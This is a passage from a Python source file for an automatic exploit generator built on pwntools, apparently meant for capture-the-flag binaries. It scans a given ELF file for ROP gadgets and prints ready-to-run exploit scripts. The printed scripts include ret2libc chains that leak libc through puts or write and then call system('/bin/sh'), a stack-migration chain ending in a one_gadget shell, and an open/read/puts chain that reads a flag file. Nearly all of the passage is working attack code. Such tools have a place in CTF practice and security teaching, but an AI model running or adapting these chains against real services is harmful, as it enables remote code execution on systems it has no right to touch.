					payload2+="+p64("+hex(rdi)+")"+"+p64("+hex(3)+")"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64("+hex(0x100)+")"+"+p64(reads)"
					payload2+="+p64("+hex(rdi)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64(puts)"+"+p64("+hex(main_addr)+")"

					print("[+]the utilization point exp is:")
					print("from pwn import *")
					print("context.log_level='debug'")
					print("elf=ELF("+"'"+file_name+"'"+")")
					print("libc=ELF("+"'"+libc_addr+"'"+")")
					print("r=process("+"'"+file_name+"'"+")")
					print(payload1)
					print("r.send(payload1)")
					print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
					print("base=leak-libc.sym['puts']")
					print("sh=base+next(libc.search('/bin/sh'))")
					print("opens=base+libc.sym['open']")
					print("reads=base+libc.sym['read']")
					print("puts=base+libc.sym['puts']")
					print(payload3)
					print("r.send(payload3)")
					print("r.send('flag')")

					print(payload2)
					print("r.send(payload2)")
					print("r.interactive()")
					print("")

def ret2libc(file_name,file_os):#分为Ubuntu18和别的Ubuntu，Ubuntu18加上ret平衡栈，当然有时候不用平衡，还有各种程序交互逻辑都由用户自己判断，本处只给出建议EXP
    #这里给出了2种rop puts和write的
	elf=ELF(file_name)
	ret=next(elf.search(asm("ret")))
	rdi=next(elf.search(asm("pop rdi;ret")))
	pop_rsi_r15_ret=next(elf.search(asm("pop rsi;pop r15;ret")))
	
	'''libc_tmp=elf.libs
				x_train1 = []
				for k in libc_tmp.items():
				    x_train1.append(k)
				libc_addr = np.array(x_train1)
				for i in len(libc_addr):
					if "/lib/x86_64-linux-gnu/" in libc_addr[0][i]:
						libc_addr=""'''
	libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
	if elf.canary or elf.pie:
		pass
	else:
		for i in range(len(stackoverflow_size)):
			if (puts_addr>0):
				if(stackoverflow_input_size[i]-stackoverflow_size[i]>0x20):
					if file_os==18:
						payload1="payload1="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("
						payload1+=hex(elf.got['puts'])+")"+"+p64("+hex(elf.plt['puts'])+")"+"+p64("+hex(main_addr)+")"

						payload2="payload2="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])
						payload2+="+p64("+hex(rdi)+")"+"+p64(sh)+p64("+hex(ret)+")"+"+p64(system)"

						print("[+]the utilization point exp is:")
						print("from pwn import *")
						print("context.log_level='debug'")
						print("elf=ELF("+"'"+file_name+"'"+")")
						print("libc=ELF("+"'"+libc_addr+"'"+")")
						print("r=process("+"'"+file_name+"'"+")")
						print(payload1)
						print("r.send(payload1)")
						print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
						print("base=leak-libc.sym['puts']")
						print("sh=base+next(libc.search('/bin/sh'))")
						print("system=base+libc.sym['system']")
						print(payload2)
						print("r.send(payload2)")
						print("r.interactive()")
						print("")
					else:
						payload1="payload1="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("
						payload1+=hex(elf.got['puts'])+")"+"+p64("+hex(elf.plt['puts'])+")"+"+p64("+hex(main_addr)+")"

						payload2="payload2="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])
						payload2+="+p64("+hex(rdi)+")"+"+p64(sh)"+"+p64(system)"

						print("[+]the utilization point exp is:")
						print("from pwn import *")
						print("context.log_level='debug'")
						print("elf=ELF("+"'"+file_name+"'"+")")
						print("libc=ELF("+"'"+libc_addr+"'"+")")
						print("r=process("+"'"+file_name+"'"+")")
						print(payload1)
						print("r.send(payload1)")
						print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
						print("base=leak-libc.sym['puts']")
						print("sh=base+next(libc.search('/bin/sh'))")
						print("system=base+libc.sym['system']")
						print(payload2)
						print("r.send(payload2)")
						print("r.interactive()")
						print("")
			elif (write_addr>0):
				if(stackoverflow_input_size[i]-stackoverflow_size[i]>0x38):
					if file_os==18:
						payload1="payload1="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64(1)"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("
						payload1+=hex(elf.got['write'])+")"+"+p64(0)"+"+p64("+hex(elf.plt['write'])+")"+"+p64("+hex(main_addr)+")"

						payload2="payload2="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])
						payload2+="+p64("+hex(rdi)+")"+"+p64(sh)+p64("+hex(ret)+")"+"+p64(system)"

						print("[+]the utilization point exp is:")
						print("from pwn import *")
						print("context.log_level='debug'")
						print("elf=ELF("+"'"+file_name+"'"+")")
						print("libc=ELF("+"'"+libc_addr+"'"+")")
						print("r=process("+"'"+file_name+"'"+")")
						print(payload1)
						print("r.send(payload1)")
						print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
						print("base=leak-libc.sym['write']")
						print("sh=base+next(libc.search('/bin/sh'))")
						print("system=base+libc.sym['system']")
						print(payload2)
						print("r.send(payload2)")
						print("r.interactive()")
						print("")
					else:
						payload1="payload1="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64(1)"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("
						payload1+=hex(elf.got['write'])+")"+"+p64(0)"+"+p64("+hex(elf.plt['write'])+")"+"+p64("+hex(main_addr)+")"

						payload2="payload2="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])
						payload2+="+p64("+hex(rdi)+")"+"+p64(sh)+p64("+hex(ret)+")"+"+p64(system)"

						print("[+]the utilization point exp is:")
						print("from pwn import *")
						print("context.log_level='debug'")
						print("elf=ELF("+"'"+file_name+"'"+")")
						print("libc=ELF("+"'"+libc_addr+"'"+")")
						print("r=process("+"'"+file_name+"'"+")")
						print(payload1)
						print("r.send(payload1)")
						print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
						print("base=leak-libc.sym['write']")
						print("sh=base+next(libc.search('/bin/sh'))")
						print("system=base+libc.sym['system']")
						print(payload2)
						print("r.send(payload2)")
						print("r.interactive()")
						print("")
def stack_migration(file_name,file_os):#栈迁移模板，暂时只支持getshell，需要用户自行判断onegadget用哪个，因为我这个是静态分析没办法的，做不到动态内存判断寄存器
	print("[+]Hey man,This is just a suggested template")
	print("[+]because the stack of stack migration sometimes needs to be filled with padding to varying degrees.") 
	print("[+]I can't guarantee that I can help you attack successfully 100%.")
	elf=ELF(file_name)
	bss_addr=elf.get_section_by_name('.bss').header.sh_addr
	print('.bss===>' + str(hex(bss_addr)))
	ret=next(elf.search(asm("ret")))
	rdi=next(elf.search(asm("pop rdi;ret")))
	pop_rsi_r15_ret=next(elf.search(asm("pop rsi;pop r15;ret")))
	libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
	if elf.pie!=True:
		if puts_addr>0:
			for i in range(len(stack_migration_addr)):
				payload1="payload1="+"'"+'a'+"'"+"*"+hex(stack_migration_size[i])+"+p64("+hex(bss_addr+0x200)
				payload1+=")"+"+p64("+hex(stack_migration_addr[i])+")"
				
				payload2="payload2="+"'"+'a'+"'"+"*"+hex(stack_migration_size[i])+"+p64("+hex(bss_addr+0x200+stack_migration_size[i])
				payload2+=")"+"+p64("+hex(stack_migration_addr[i])+")"

				payload3="payload3=p64(0)+p64("+hex(rdi)+")"+"+p64("+hex(elf.got['puts'])+")"+"+p64("+hex(elf.plt['puts'])+")"+"+p64("+hex(stack_migration_addr[i])+")"

				payload4="payload4=p64(0)*4+p64(one)"

				print("[+]hay,look at me!This one=base+onegadget you should choice which onegadget is you need")
				print("[+]the utilization point exp is:")
				print("from pwn import *")
				print("context.log_level='debug'")
				print("elf=ELF("+"'"+file_name+"'"+")")
				print("libc=ELF("+"'"+libc_addr+"'"+")")
				print("r=process("+"'"+file_name+"'"+")")
				print(payload1)
				print("r.send(payload1)")
				print("sleep(0.2)")
				print(payload2)
				print("r.send(payload2)")
				print("sleep(0.2)")
				print(payload3)
				print("r.send(payload3)")
				print("sleep(0.2)")
				print("leak=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00+'))")
				print("base=leak-libc.sym['puts']")
				print("sh=base+next(libc.search('/bin/sh'))")
				print("system=base+libc.sym['system']")
				print("'''")
				cmd = os.popen("one_gadget /lib/x86_64-linux-gnu/libc.so.6")
				onegadgets=cmd.read() #利用管道获取onegadgets
				print(onegadgets)
				print("'''")
				print("one=base+your_choice_onegadget")
				print(payload4)
				print("r.send(payload4)")
				print("r.interactive()")
				print("")


def banner():
	banner='''
 ████████ ██     ██ ████████ ████████
░██░░░░░ ░██    ░██░░░░░░██ ░░░░░░██ 
░██      ░██    ░██     ██       ██  
░███████ ░██    ░██    ██       ██   
░██░░░░  ░██    ░██   ██       ██    
░██      ░██    ░██  ██       ██     
░██      ░░███████  ████████ ████████
░░        ░░░░░░░  ░░░░░░░░ ░░░░░░░░      

                                            ——Powered By HRP

  '''
	print(banner)  

syscall_table=[]
def init():
	try:
		with open(r'syscall_table.txt' ,'r') as f:
		    for line in f:
		     	syscall_table.append(line.strip().split(',')[0])  #a.append(b)：是将b原封不动的追加到a的末尾上，会改变a的值
		        	#strip()用于移除字符串头尾指定的字符（默认为空格或者换行符）或字符序列

	except Exception as e:
		print("[+]please give me syscall_table.txt")
		exit(0)
	else:
		pass
	finally:
		pass
	banner()

if __name__ == '__main__':
    init()
    if len(sys.argv)<2:
    	print("[+]please input file name!")
    	exit(0)
    try:
    	file_name=sys.argv[1]#外部获取文件名
    	elf=ELF(file_name)
    	if elf.arch=='i386':
    		print("[+]WE DO NOT SUPPORT I386 BINARY!")
    		exit(0)
    except Exception as e:
    	print("[+]not found file,please check your name!")
    else:
    	search_call_what(elf,file_name)
    finally:
    	pass							
